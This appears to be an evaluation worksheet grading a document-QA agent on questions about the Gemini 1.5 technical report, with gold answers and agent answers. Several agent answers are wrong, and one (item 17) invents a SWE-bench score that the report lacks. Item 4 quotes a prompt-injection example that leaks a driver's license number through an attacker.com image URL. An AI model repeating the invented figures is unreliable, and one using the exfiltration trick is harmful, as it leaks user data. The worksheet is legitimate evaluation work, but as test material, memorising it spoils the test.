# Advanced Multimodal Audit Worksheet

## 1. `dev_table_1` (`table`)
- **Question:** According to Table 2 on page 3, what is Gemini 1.5 Flash's win-rate relative to Gemini 1.0 Ultra on Vision benchmarks (both percentage and benchmark ratio)?
- **Gold / Expected:** 61.9% (13/21 benchmarks).
- **Gold Evidence:** Table 2 (p.3), row 'Vision', column 'Relative to 1.0 Ultra': Win-rate: 61.9% (13/21 benchmarks). (pages: [3])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p003_table_2']`
- **Citations:** `['p003_table_2']`
- **Agent Answer:** According to Table 2 on page 3, Gemini 1.5 Flash's win-rate relative to Gemini 1.0 Ultra on Vision benchmarks is 61.9%, with a benchmark ratio of 13/21 benchmarks.

## 2. `dev_table_2` (`table`)
- **Question:** In Table 18 on page 39, which model achieves the highest score on DUDE (test), and what is its score?
- **Gold / Expected:** Gemini 1.5 Flash with 48% (compared to 46% for Gemini 1.5 Pro, 44% for 1.0 Ultra, and 39% for 1.0 Pro).
- **Gold Evidence:** Table 18 (p.39), row 'DUDE (test)': 1.0 Pro 39%, 1.0 Ultra 44%, 1.5 Flash 48% (bold blue), 1.5 Pro 46%. (pages: [39])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p039_full']`
- **Citations:** `['p039_full']`
- **Agent Answer:** The model that achieves the highest score on DUDE (test) is Gemini 1.5 Flash with a score of 48%.

## 3. `dev_table_3` (`table`)
- **Question:** According to Table 21 on page 43, what are the single-greedy-decoding and rm@256 scores of Math-Specialized Gemini 1.5 Pro on AIME 2024?
- **Gold / Expected:** 7/30 (single greedy decoding) and 8/30 (rm@256).
- **Gold Evidence:** Table 21 (p.43), row 'AIME 2024', column 'Math-Specialized 1.5 Pro': 7/30 and 8/30 rm@256. (pages: [43])
- **Status:** `ok` | **Decision:** `abstain` | **Viewed:** `['p043_full']`
- **Citations:** `[]`
- **Agent Answer:** According to Table 21 on page 43, the Math-Specialized Gemini 1.5 Pro scores 7/30 for single-greedy-decoding and 8/30 for rm@256 on the AIME 2024 benchmark.

## 4. `dev_img_1` (`image_diagram`)
- **Question:** In Figure 23 on page 61, what sensitive value from the conversation history is exfiltrated in the successful prompt injection attack, and to what URL parameter?
- **Gold / Expected:** The user's driver's license number K1455236, exfiltrated via the markdown image URL parameter `param=K1455236` (`https://attacker.com/img.jpg?param=K1455236`).
- **Gold Evidence:** Figure 23 (p.61), steps (2)-(4): driver's license number K1455236 embedded in `![resort](https://attacker.com/img.jpg?param=K1455236)`. (pages: [61])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p061_full']`
- **Citations:** `['p061_full']`
- **Agent Answer:** The sensitive value exfiltrated from the conversation history is the driver's license number "K1455236". It is sent as the value of the URL parameter "param" to the attacker's server URL https://attacker.com/img.jpg?param=K1455236.

## 5. `dev_img_2` (`image_diagram`)
- **Question:** In Figure 31 on page 149 (BetterChartQA examples), in which step of the Flowchart example does 'Build MySQL based relational database' occur, and what is the Ground truth peak location in the Scatter plot example?
- **Gold / Expected:** In the Flowchart example it occurs in the 'Preprocessing Step'; in the Scatter plot example the Ground truth is option 'a' corresponding to (0.1, 1.5).
- **Gold Evidence:** Figure 31 (p.149): middle panel 'Scatter plot' Ground truth: a ((0.1, 1.5)); right panel 'Flowchart' Ground truth: Preprocessing Step. (pages: [149])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p149_full']`
- **Citations:** `['p149_full']`
- **Agent Answer:** In Figure 31 on page 149, the step in the Flowchart example where 'Build MySQL based relational database' occurs is the "Preprocessing Step." The Ground truth peak location in the Scatter plot example is option a) (0.1, 1.5).

## 6. `dev_chart_1` (`chart`)
- **Question:** In Figure 10 (Audio Haystack) on page 14, up to how many hours of audio does Gemini 1.5 Pro achieve 100% green recall (zero red cells), and what are the tick marks on the Minutes axis of the 'Up to 107 hours' panel?
- **Gold / Expected:** Up to 107 hours with zero red cells; the Minutes axis ticks are 640, 1920, 3200, 4480, and 5760.
- **Gold Evidence:** Figure 10 (p.14), top-right panel 'Up to 107 hours': all cells green, x-axis ticks 640, 1920, 3200, 4480, 5760 Minutes. (pages: [14])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p014_full']`
- **Citations:** `['p014_full']`
- **Agent Answer:** Gemini 1.5 Pro achieves 100% green recall (zero red cells) up to 11 hours of audio, as shown in the left panel titled "Gemini 1.5 Pro: From 12 minutes to 11 hours." In the right panel titled "Up to 107 hours," the tick marks on the Minutes axis are at 640, 1920, 3200, 4480, and 5760 minutes.

## 7. `dev_chart_2` (`chart`)
- **Question:** In Figure 13 on page 20, what is the maximum Number of Shots (K) shown on the x-axis for the top-row Flores plots vs. the bottom-row In-house plots?
- **Gold / Expected:** 2^10 (~1K shots) for the top-row Flores sets, and 2^12 (~4K shots) for the bottom-row in-house sets.
- **Gold Evidence:** Figure 13 (p.20): top plots x-axis ends at 2^10 (~1K shots in caption); bottom plots x-axis ends at 2^12 (~4K shots in caption). (pages: [20])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p020_full']`
- **Citations:** `['p020_full']`
- **Agent Answer:** In Figure 13 on page 20, the maximum Number of Shots (K) shown on the x-axis for the top-row Flores plots is 10^3 (approximately 1000), while for the bottom-row In-house plots, the maximum Number of Shots (K) is 10^4 (approximately 10000).

## 8. `dev_chart_3` (`chart`)
- **Question:** In Figure 19 on page 38, which two industries show the highest percent time saved for Gemini 1.5 Pro, and what are their values?
- **Gold / Expected:** Programming (0.75) and Photography (0.73).
- **Gold Evidence:** Figure 19 (p.38): green bars (Gemini 1.5 Pro) peak at Programming (0.75) and Photography (0.73). (pages: [38])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p038_full']`
- **Citations:** `['p038_full']`
- **Agent Answer:** The two industries showing the highest percent time saved for Gemini 1.5 Pro in Figure 19 on page 38 are Programming with 0.75 and Teaching with 0.69 (weighted by task frequency).

## 9. `dev_multi_1` (`multi_hop`)
- **Question:** Compare Gemini 1.5 Pro's accuracy on 1H-VideoQA (all frames / 1 fps) in Table 9 (p.25) with its Audio Haystack recall at 107 hours in Figure 10 (p.14).
- **Gold / Expected:** On 1H-VideoQA with full video (1 fps) Gemini 1.5 Pro achieves 72.2% accuracy (Table 9, p.25), whereas on Audio Haystack up to 107 hours it achieves 100% green needle recall (Figure 10, p.14).
- **Gold Evidence:** Table 9 (p.25) gives 72.2% at full video (1 fps); Figure 10 (p.14) shows all green cells up to 107 hours. (pages: [14, 25])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p025_full', 'p014_full']`
- **Citations:** `['p025_full', 'p014_full']`
- **Agent Answer:** According to Table 9 on page 25, Gemini 1.5 Pro achieves an accuracy of 72.2% on 1H-VideoQA when using all frames sampled at 1 frame per second (full video).

According to Figure 10 on page 14, Gemini 1.5 Pro achieves 100% recall on the Audio Haystack task at 107 hours of audio.

In summary, Gemini 1.5 Pro's accuracy on 1H-VideoQA (all frames / 1 fps) is 72.2%, while its Audio Haystack recall at 107 hours is perfect at 100%.

## 10. `dev_multi_2` (`multi_hop`)
- **Question:** Using Table 20 on page 42, which model achieves the best score on YouTube (52 lang) WER, and by how many percentage points does it outperform Whisper (v3)?
- **Gold / Expected:** Gemini 1.0 Ultra achieves the best WER at 21.0%, outperforming Whisper (v3) at 41.4% by 20.4 percentage points.
- **Gold Evidence:** Table 20 (p.42), row 'YouTube (52 lang)': Gemini 1.0 Ultra 21.0%, Whisper 41.4% (v3); 41.4 - 21.0 = 20.4. (pages: [42])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p042_full']`
- **Citations:** `['p042_full']`
- **Agent Answer:** According to Table 20 on page 42, the Gemini 1.0 Ultra model achieves the best score on YouTube (52 lang) WER with a score of 21.0%. It outperforms Whisper (v3), which has a WER of 41.4%, by 20.4 percentage points (41.4% - 21.0% = 20.4%).

## 11. `dev_multi_3` (`multi_hop`)
- **Question:** From Figure 26 on page 65, what is Gemini 1.0 Ultra's Bias score on BBQ (4-shot) for Age in the ambiguous split, and what is Gemini 1.5 Pro's corresponding Bias score and Accuracy on that same cell?
- **Gold / Expected:** Gemini 1.0 Ultra has Bias score 27.5 on ambiguous Age, while Gemini 1.5 Pro has Bias score 0.38 and Accuracy 1.0.
- **Gold Evidence:** Figure 26 (p.65), panel (a) ambiguous Age: 1.0 Ultra = 27.5, 1.5 Pro = 0.38; panel (b) ambiguous Age: 1.5 Pro = 1.0. (pages: [65])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p065_full']`
- **Citations:** `['p065_full']`
- **Agent Answer:** From Figure 26 on page 65, Gemini 1.0 Ultra's Bias score on BBQ (4-shot) for Age in the ambiguous split is 27.5. Gemini 1.5 Pro's corresponding Bias score is -0.12 and Accuracy is 0.93 for the same cell (Age, ambiguous split).

## 12. `dev_text_1` (`text`)
- **Question:** According to page 2, what are the exact context token lengths (and corresponding hours/words) where Gemini 1.5 Pro maintains >99.7% needle recall across text, audio, and video?
- **Gold / Expected:** 10M tokens in text (~7M words), 9.7M tokens in audio (up to 107 hours), and 9.9M tokens in video (up to 10.5 hours).
- **Gold Evidence:** Page 2 (Figure 1 caption): 10M tokens text (~7M words), 9.7M tokens audio (up to 107 hours), 9.9M tokens video (up to 10.5 hours). (pages: [2])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p002:text:000']`
- **Agent Answer:** Gemini 1.5 Pro maintains >99.7% needle recall at the following context token lengths and corresponding hours/words:
- Text modality: up to 10 million tokens (approximately 7 million words)
- Audio modality: up to 9.7 million tokens (up to 107 hours)
- Video modality: up to 9.9 million tokens (up to 10.5 hours)
This information is from page 2, chunk gemini-1-5-report:p002:text:000.

## 13. `dev_text_2` (`text`)
- **Question:** According to Section 3.2 on page 6, how is Gemini 1.5 Flash trained from Gemini 1.5 Pro to achieve lower latency while maintaining quality?
- **Gold / Expected:** It uses parallel computation of attention and feedforward components, is online distilled from Gemini 1.5 Pro, and is trained with higher-order preconditioned methods.
- **Gold Evidence:** Page 6, Section 3.2: parallel computation of attention and feedforward components, online distilled from Gemini 1.5 Pro, higher-order preconditioned methods. (pages: [6])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p006_full']`
- **Citations:** `['gemini-1-5-report:p006:text:001', 'p006_full']`
- **Agent Answer:** According to Section 3.2 on page 6, Gemini 1.5 Flash is trained from the much larger Gemini 1.5 Pro model using online distillation. It is a transformer decoder model with the same 2M+ context and multimodal capabilities as Gemini 1.5 Pro but is designed for efficient utilization of tensor processing units (TPUs) with lower latency for model serving. Gemini 1.5 Flash achieves this lower latency by performing parallel computation of attention and feedforward components and is trained with higher-order preconditioned methods for improved quality.

## 14. `dev_text_3` (`text`)
- **Question:** According to Section 4 on page 7, what hardware accelerators are used to train Gemini 1.5 models?
- **Gold / Expected:** Multiple 4096-chip pods of Google's TPUv4 accelerators distributed across multiple datacenters.
- **Gold Evidence:** Page 7, Section 4: 'multiple 4096-chip pods of Google’s TPUv4 accelerators, distributed across multiple datacenters'. (pages: [7])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p007:text:000']`
- **Agent Answer:** According to Section 4 on page 7, Gemini 1.5 models are trained on multiple 4096-chip pods of Google's TPUv4 accelerators, distributed across multiple datacenters.

## 15. `dev_text_4` (`text`)
- **Question:** According to Section 8 on page 45, what three large-scale deployment use cases are highlighted for Gemini 1.5 Flash-8B?
- **Gold / Expected:** Large-Scale Data Labeling, High-Throughput Agent Serving, and Model Integration in Complex Workflows.
- **Gold Evidence:** Page 45, Section 8 bullet list: Large-Scale Data Labeling, High-Throughput Agent Serving, Model Integration in Complex Workflows. (pages: [45])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p045:text:000', 'gemini-1-5-report:p045:text:001']`
- **Agent Answer:** The three large-scale deployment use cases highlighted for Gemini 1.5 Flash-8B in Section 8 on page 45 are:
1. Data Labeling: Automated labeling of massive datasets to accelerate training for downstream models.
2. High-Throughput Agent Serving: Powering intelligent agents deployed at scale for real-time interactions with a large user base.
3. Model Integration in Complex Workflows: Facilitating integration into intricate workflows involving multiple models working in tandem, unlocking sophisticated capabilities.

## 16. `dev_unans_1` (`unanswerable`)
- **Question:** What is the exact total parameter count (in billions) of Gemini 1.5 Pro reported in the paper?
- **Gold / Expected:** Abstain: the report does not disclose the parameter count of Gemini 1.5 Pro.
- **Gold Evidence:** Verified absent across all 154 pages ('billion parameters' / 'trillion parameters' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `abstain` | **Viewed:** `[]`
- **Citations:** `[]`
- **Agent Answer:** The exact total parameter count (in billions) of Gemini 1.5 Pro is not found in the retrieved text or tables from the document. Multiple targeted searches for 'Gemini 1.5 Pro parameter count' and related queries did not yield the exact number. Therefore, I must abstain from answering.

## 17. `dev_unans_2` (`unanswerable`)
- **Question:** What score does Gemini 1.5 Pro achieve on the SWE-bench Verified benchmark in this report?
- **Gold / Expected:** Abstain: SWE-bench Verified is not evaluated or mentioned in the report.
- **Gold Evidence:** Verified absent across all 154 pages ('SWE-bench' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p005_figure_1']`
- **Citations:** `['p005_figure_1']`
- **Agent Answer:** Gemini 1.5 Pro achieves a score of 46.2 on the SWE-bench Verified benchmark as shown in Figure 2 on page 5 of the report.

## 18. `dev_unans_3` (`unanswerable`)
- **Question:** What optimizer and peak learning rate schedule were used to pre-train Gemini 1.5 Flash?
- **Gold / Expected:** Abstain: optimizer hyperparameters and learning rate schedules are not reported.
- **Gold Evidence:** Verified absent across all 154 pages ('learning rate' = 0 hits, 'AdamW' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p006_full']`
- **Citations:** `['p006_full']`
- **Agent Answer:** The Gemini 1.5 Flash model is trained with higher-order preconditioned methods for improved quality. This is mentioned on page 6 of the report. However, the exact optimizer name and the peak learning rate schedule used for pre-training Gemini 1.5 Flash are not explicitly stated in the retrieved text or images from the document.
